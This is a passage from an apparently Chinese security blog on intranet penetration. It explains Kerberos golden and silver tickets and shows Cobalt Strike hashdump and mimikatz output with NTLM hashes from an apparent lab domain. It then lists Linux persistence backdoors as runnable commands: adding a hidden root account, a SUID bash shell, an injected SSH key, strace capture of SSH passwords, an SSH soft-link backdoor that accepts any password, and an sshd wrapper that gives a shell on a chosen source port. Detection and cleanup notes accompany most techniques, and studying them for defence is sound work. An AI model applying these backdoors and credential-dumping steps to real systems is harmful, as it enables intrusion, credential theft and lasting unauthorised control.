<h4 id="白银票据（Silver-ticket）"><a href="#白银票据（Silver-ticket）" class="headerlink" title="白银票据（Silver ticket）"></a><strong>白银票据（Silver ticket）</strong></h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino">如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。<br>在Kerberos认证的第三部，<span class="hljs-built_in">Client</span>带着ST和Authenticator3向<span class="hljs-built_in">Server</span>上的某个服务进行请求，<span class="hljs-built_in">Server</span>接收到<span class="hljs-built_in">Client</span>的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 <span class="hljs-built_in">Client</span> 访问server上的指定服务了。<br>所以我们只需要知道<span class="hljs-built_in">Server</span>用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。<br><br>参考：https:<span class="hljs-comment">//www.jianshu.com/p/4936da524040</span><br></code></pre></td></tr></table></figure>

<h5 id="所需条件-1"><a href="#所需条件-1" class="headerlink" title="所需条件"></a><strong>所需条件</strong></h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>域名<br><span class="hljs-number">2.</span>域sid<br><span class="hljs-number">3.</span>目标服务器名<br><span class="hljs-number">4.</span>可利用的服务<br><span class="hljs-number">5.</span>服务账号的NTML <span class="hljs-built_in">HASH</span> <br><span class="hljs-number">6.</span>需要伪造的用户名<br></code></pre></td></tr></table></figure>

<h5 id="总结-参考"><a href="#总结-参考" class="headerlink" title="总结&amp;&amp;参考"></a><strong>总结&amp;&amp;参考</strong></h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">金票和银票的区别<br>获取的权限不同<br>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS<br><br>认证流程不同<br>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server<br><br>加密方式不同<br>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密<br><br>https:<span class="hljs-regexp">//</span>www.likecs.com/show-<span class="hljs-number">454375</span>.html<br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">4936</span>da524040<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/lhh134/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">104139081</span><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">1</span>ec166b4fcf8<br>之前做实验的时候还看了很多其他的文章...<br></code></pre></td></tr></table></figure>

<h4 id="实战-权限维持-黄金票据："><a href="#实战-权限维持-黄金票据：" class="headerlink" title="实战-权限维持-黄金票据："></a>实战-<strong>权限维持-黄金票据：</strong></h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">从DC中hashdump出krbtgt的<span class="hljs-built_in">hash</span>值，krbtgt用户是域中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户<br></code></pre></td></tr></table></figure>

<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">beacon&gt; hashdump<br>[*] <span class="hljs-title class_">Tasked</span> beacon to dump hashes<br>[+] host called home, <span class="hljs-symbol">sent:</span> <span class="hljs-number">82541</span> bytes<br>[+] received password <span class="hljs-symbol">hashes:</span><br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">161</span>cff084477fe596a5db81874498a24:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">krbtgt:</span><span class="hljs-number">502</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">82</span>dfc71b72a11ef37d663047bc2088fb:::<br><span class="hljs-symbol">de1ay:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">161</span>cff084477fe596a5db81874498a24:::<br><span class="hljs-symbol">mssql:</span><span class="hljs-number">2103</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">161</span>cff084477fe596a5db81874498a24:::<br><span class="hljs-title class_">DC</span><span class="hljs-variable">$:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:f38f278a2c7a92ac0642375ef8c44a23</span>:::<br><span class="hljs-title class_">PC</span><span class="hljs-variable">$:</span><span class="hljs-number">1105</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">47</span>e7baa98451a0cc2d567a2cbd15c289:::<br><span class="hljs-title class_">WEB</span><span class="hljs-variable">$:</span><span class="hljs-number">1603</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">135</span>e025df9ab10fa921c2bf5845e9a29::<span class="hljs-symbol">:</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/18.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>在DC查看域的sid</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">beacon&gt;</span> <span class="hljs-string">logonpasswords</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">Tasked</span> <span class="hljs-string">beacon</span> <span class="hljs-string">to</span> <span class="hljs-string">run</span> <span class="hljs-string">mimikatz&#x27;s</span> <span class="hljs-string">sekurlsa::logonpasswords</span> <span class="hljs-string">command</span><br>[<span class="hljs-string">+</span>] <span class="hljs-string">host</span> <span class="hljs-string">called</span> <span class="hljs-string">home,</span> <span class="hljs-attr">sent:</span> <span class="hljs-number">312954</span> <span class="hljs-string">bytes</span><br>[<span class="hljs-string">+</span>] <span class="hljs-attr">received output:</span><br><br><span class="hljs-attr">Authentication Id :</span> <span class="hljs-number">0</span> <span class="hljs-string">;</span> <span class="hljs-number">220494</span> <span class="hljs-string">(00000000:00035d4e)</span><br><span class="hljs-attr">Session           :</span> <span class="hljs-string">Interactive</span> <span class="hljs-string">from</span> <span class="hljs-number">1</span><br><span class="hljs-attr">User Name         :</span> <span class="hljs-string">de1ay</span><br><span class="hljs-attr">Domain            :</span> <span class="hljs-string">DE1AY</span><br><span class="hljs-attr">Logon Server      :</span> <span class="hljs-string">DC</span><br><span class="hljs-attr">Logon Time        :</span> <span class="hljs-number">2025</span><span class="hljs-string">/7/1</span> <span class="hljs-number">16</span><span class="hljs-string">:12:25</span><br><span class="hljs-attr">SID               :</span> <span class="hljs-string">S-1-5-21-2756371121-2868759905-3853650604-1001</span><br>    <span class="hljs-attr">msv :</span>    <br>     [<span class="hljs-number">00000003</span>] <span class="hljs-string">Primary</span><br>     <span class="hljs-string">*</span> <span class="hljs-attr">Username :</span> <span class="hljs-string">de1ay</span><br>     <span class="hljs-string">*</span> <span class="hljs-attr">Domain   :</span> <span class="hljs-string">DE1AY</span><br>     <span class="hljs-string">*</span> <span class="hljs-attr">NTLM     :</span> <span class="hljs-string">161cff084477fe596a5db81874498a24</span><br>     <span class="hljs-string">*</span> <span class="hljs-attr">SHA1     :</span> <span class="hljs-string">d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br>     [<span class="hljs-number">00010000</span>] <span class="hljs-string">CredentialKeys</span><br>     <span class="hljs-string">*</span> <span class="hljs-attr">NTLM     :</span> <span class="hljs-string">161cff084477fe596a5db81874498a24</span><br>     <span class="hljs-string">*</span> <span class="hljs-attr">SHA1     :</span> <span class="hljs-string">d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br>    <span class="hljs-attr">tspkg :</span>    <br>    <span class="hljs-attr">wdigest :</span>    <br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/19.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>在web主机生成黄金票据</p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/20.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/21.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">先删除之前建立的ipc连接，看看票据有咩有走通 （因为之前已经用ipc横向之后，用schtasks做过权限维持了，这边删掉。重新做一次）<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/22.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">再执行<span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\10.10.10.10\c$</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/23.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><strong>直接获取维持全域的权限（201没横过）</strong></p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/24.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h4 id="实战-权限维持-白银票据"><a href="#实战-权限维持-白银票据" class="headerlink" title="**实战-权限维持-白银票据"></a>**实战-<strong>权限维持-白银票据</strong></h4><p>类似低等一点的白银票据，也是要获取sid和 hash值</p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/25.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>cs上填入这些</p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/26.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>黄金票据和白银票据最后都是这一步，访问域控的c盘</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\10.10.10.10\c$</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/27.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h3 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h3><h4 id="Linux-后门"><a href="#Linux-后门" class="headerlink" title="Linux 后门"></a>Linux 后门</h4><h5 id="1-添加root用户"><a href="#1-添加root用户" class="headerlink" title="1.添加root用户"></a>1.添加root用户</h5><p><strong>(1) 原理：</strong></p>
<p>添加账户为r00t密码为password的root账户（如果未成功，尝试增加密码复杂度）：</p>
<pre><code class="hljs">useradd -u 0 -o -g root -G root r00t
echo r00t:password|chpasswd
</code></pre>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux1.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>Centos 7：</p>
<p>或者：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">perl -e <span class="hljs-string">&#x27;print crypt(&quot;toor&quot;,&quot;AA&quot;).&quot;\n&quot;&#x27;</span> <span class="hljs-comment"># 密码为toor</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;backdoor:AAug171jePcFo:0:0:me:/root:/bin/bash&quot;</span>&gt;&gt;/etc/passwd <span class="hljs-comment"># AAug171jePcFo为第一行命令执行结果</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux2.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>也可以设置其他账户（比如mysqld）为可登陆并加入root组。</p>
<p><strong>(2) 检测：</strong> 查看&#x2F;etc&#x2F;passwd文件中是否有uid&#x3D;0的非root账户。</p>
<p><strong>(3) 清除：</strong> 删除对应账户。</p>
<h5 id="2-设置suid权限位"><a href="#2-设置suid权限位" class="headerlink" title="2.设置suid权限位"></a>2.设置suid权限位</h5><p><strong>(1) 原理：</strong></p>
<p>设置了suid权限位的文件在执行时具有该文件拥有者的权限，所以可以在root权限时留一个bash文件的后门，使得在低权限时能够通过该后门获得root权限。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> /bin/bash /tmp/test<br><span class="hljs-built_in">chmod</span> 4755 /tmp/test <span class="hljs-comment"># 或者 chmod u+s /tmp/test</span><br>/tmp/test -p <span class="hljs-comment"># 因为在bash2中添加了防护措施，无法直接获取root shell，使用-p参数获取</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux3.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><strong>(2) 检测：</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">find / -perm -4000 <span class="hljs-comment"># 查找设置了suid权限位的文件</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux4.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><strong>(3) 清除：</strong></p>
<pre><code class="hljs">chmod -s /tmp/test # 或者 chmod 755 /tmp/test
</code></pre>
<h5 id="3-bash环境文件"><a href="#3-bash环境文件" class="headerlink" title="3.bash环境文件"></a>3.bash环境文件</h5><p><strong>(1) 原理：</strong></p>
<p>bash环境文件&#x2F;etc&#x2F;profile、<del>&#x2F;.bash_profile、</del>&#x2F;.bashrc、~&#x2F;.bash_logout等，这些文件本质上是bash脚本文件，当用户登录系统之后，会陆续执行其中的部分文件，在其中写入bash命令即可在用户登录时执行。</p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux5.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><strong>(2) 检测：</strong> 检查各个环境变量文件中是否存在异常代码：<br>&#x2F;etc&#x2F;profile、&#x2F;etc&#x2F;profile.d&#x2F;*.sh、<del>&#x2F;.bash_profile、</del>&#x2F;.profile、<del>&#x2F;.bashrc、</del>&#x2F;.bash_logout、&#x2F;etc&#x2F;bashrc、&#x2F;etc&#x2F;bash.bashrc</p>
<p><strong>(3) 清除：</strong> 删除异常代码即可。</p>
<h5 id="4-ssh公钥"><a href="#4-ssh公钥" class="headerlink" title="4.ssh公钥"></a>4.ssh公钥</h5><p><strong>(1) 原理：</strong></p>
<p>Linux主机在打开了ssh时默认同时开启密钥登录。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 攻击机：</span><br>ssh-keygen -t rsa <span class="hljs-comment"># 生成ssh密钥对，公钥里会带有当前主机的用户名和主机名</span><br><span class="hljs-built_in">cat</span> /home/ubuntu/.ssh/id_rsa.pub<br><br><span class="hljs-comment"># 目标机：</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2EHyw6D3qwT2YufMrEz5TEO3AQ4qWNmHOT324GKAz3f0ej94wwmDfjOnIFa+3h48HIVtoczx3Tk3BRtIIHnyVhHB2o5tMjND06EGIHg3t8whl3eoySTKOqd0CyMS8iElMpexrH6KiKnc4dUbDYFNnysFIYn0cpoomJ8aLuDzBZrzJCaCClqT+SQA12VO78Q6ysCQX5JSWbkG/tfj+q7xDhrcvJ1aBN9WlSRpFWqSjB5KakMASxbMM+JbY1WsdzslvieKZV2s9fSiUP/9SBjKi81fWNZ4LhEp/+N653iQ5OMiKjTHXAOWNGg7U6O8nmWlGEJ2fJIZh6YCus9vxlSh7&quot;</span> &gt;&gt; /root/.ssh/authorized_keys<br><span class="hljs-comment"># 在目标机上将公钥写入到authorized_keys文件，注意这里可以把用户名和主机信息去掉</span><br><br><span class="hljs-comment"># 攻击机：</span><br>ssh -i id_rsa root@127.0.0.1 <span class="hljs-comment"># 在攻击机上利用私钥登录。</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux6.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><strong>(2) 检测：</strong> 查看authorized_keys文件是否有异常公钥。</p>
<p><strong>(3) 清除：</strong> 删除异常公钥。</p>
<h5 id="5-strace记录认证信息"><a href="#5-strace记录认证信息" class="headerlink" title="5.strace记录认证信息"></a>5.strace记录认证信息</h5><p><strong>(1) 原理：</strong></p>
<p>strace用来跟踪一个进程执行时所产生的系统调用，或者说是用来监视系统调用的，他可以监视一个新进行的系统调用，也可以监视已经在运行的系统调用，可以获取到参数、返回值、执行时间等，可以利用strace来监视sshd进程，获取用ssh登录的账户密码。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 开启strace</span><br>ps -ef | grep <span class="hljs-string">&quot;sshd -D&quot;</span> | grep -v grep | awk &#123;<span class="hljs-string">&#x27;print $2&#x27;</span>&#125;<br>strace -f -p 6020 -o /tmp/.sshOutput.<span class="hljs-built_in">log</span> -e trace=write -s 2048 &amp;<br><br><span class="hljs-comment"># 等待ssh被连接</span><br><br><span class="hljs-comment"># 查看结果</span><br>grep -n <span class="hljs-string">&quot;write(4, \&quot;\\\\0\\\\0\\\\0\\\\&quot;</span> /tmp/.sshOutput.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux7.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux9.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>此外，可以使用alias添加别名，记录目标机登录别的主机的ssh密码。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 添加ssh别名</span><br><span class="hljs-built_in">alias</span> ssh=<span class="hljs-string">&#x27;strace -o /tmp/.sshOutput_`date +%Y%m%d%H%M%S`.log -e read,write,connect -s 2048 ssh&#x27;</span><br><br><span class="hljs-comment"># 等待ssh连接别的主机</span><br><br><span class="hljs-comment"># 查看结果</span><br>grep -n <span class="hljs-string">&quot;password: \&quot;&quot;</span> -A 5  /tmp/.sshOutput_20200522011509.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux8.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><strong>(2) 检测：</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">ps -aux | grep strace <span class="hljs-comment"># 查看有无对sshd进程监视的strace进程</span><br><span class="hljs-built_in">alias</span> <span class="hljs-comment"># 查看是否有异常alias</span><br></code></pre></td></tr></table></figure>

<p><strong>(3) 清除：</strong></p>
<p>kill掉对应进程；取消alias。</p>
<pre><code class="hljs">unalias ssh
</code></pre>
<h5 id="6-ssh任意密码登录后门（ssh软链接后门）"><a href="#6-ssh任意密码登录后门（ssh软链接后门）" class="headerlink" title="6.ssh任意密码登录后门（ssh软链接后门）"></a>6.ssh任意密码登录后门（ssh软链接后门）</h5><p><strong>(1) 原理：</strong></p>
<p>ssh登录默认使用PAM进行认证，而在root条件下，部分命令比如su、chsh、chfn等在执行时，无需使用密码，因为这些命令在PAM认证时使用了pam_rootok.so进行认证：</p>
<p>pam_rootok.so：主要作用是使uid&#x3D;0的账户在认证时直接通过。</p>
<p>PAM在认证时，以命名名字在&#x2F;etc&#x2F;pam.d&#x2F;目录下查找PAM配置文件。</p>
<p>部分配置文件中，对于认证采用了pam_rootok.so，并且使用了sufficient控制标记。</p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux10.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>则可以将sshd链接到使用rookok.so进行认证的命令上，并新开一个端口。</p>
<pre><code class="hljs">ln -sf /usr/sbin/sshd /tmp/su
/tmp/su -oport=10022

or

ln -sf /usr/sbin/sshd /tmp/chsh
/tmp/chsh -oport=10022

or

ln -sf /usr/sbin/sshd /tmp/chfn
/tmp/chfn -oport=10022

iptables -F
</code></pre>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux11.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux12.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<blockquote>
<p>CentOS下不止这三个文件，具体待实测。</p>
</blockquote>
<p><strong>(2) 检测：</strong> 类似后门会开放端口，在网络连接中可以查看</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">netstat -antp | grep -E <span class="hljs-string">&quot;su|chsh|chfn&quot;</span> <span class="hljs-comment"># 找到异常端口及进程</span><br>ps -aux | grep 29604 <span class="hljs-comment"># 通过进程找到异常文件</span><br></code></pre></td></tr></table></figure>

<p><strong>(3) 清除：</strong></p>
<pre><code class="hljs">netstat -antp | grep -E &quot;su|chsh|chfn&quot; | awk &#123;&#39;print $7&#39;&#125; | cut -d / -f 1 | sort -u | xargs kill -9
</code></pre>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux13.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<h5 id="7-ssh认证流程后门-ssh-wrapper后门"><a href="#7-ssh认证流程后门-ssh-wrapper后门" class="headerlink" title="7.ssh认证流程后门(ssh wrapper后门)"></a>7.ssh认证流程后门(ssh wrapper后门)</h5><p><strong>(1) 原理：</strong></p>
<p>ssh登录时，系统处理登录请求的文件是&#x2F;usr&#x2F;sbin&#x2F;sshd，那么就可以修改该文件，在登录时执行特定操作。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 目标机上：</span><br><span class="hljs-built_in">cd</span> /usr/sbin<br><span class="hljs-built_in">mv</span> sshd ../bin <span class="hljs-comment"># 将正常sshd文件移到任意目录下</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec &quot;/bin/bash -i&quot; if(getpeername(STDIN) =~ /^..LF/);&#x27;</span> &gt;&gt;sshd <span class="hljs-comment"># 当登录的源端口为19526时，直接返回一个shell</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd <span class="hljs-comment"># 若不是19526端口，则执行正常ssh登录流程，这里花括号里的路径是前面第二条命令的sshd的路径</span><br><span class="hljs-built_in">chmod</span> u+x sshd<br>/etc/init.d/sshd restart<br><br><span class="hljs-comment"># 攻击机上</span><br>socat STDIO TCP4:127.0.0.1:22,<span class="hljs-built_in">bind</span>=:19526<br><br>or<br><br>socat STDIO TCP4:127.0.0.1:22,sourceport=19526<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux14.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux15.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux16.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">



<p>为什么是19526端口，LF代表了端口号，如果想修改端口号可以如下操作：</p>
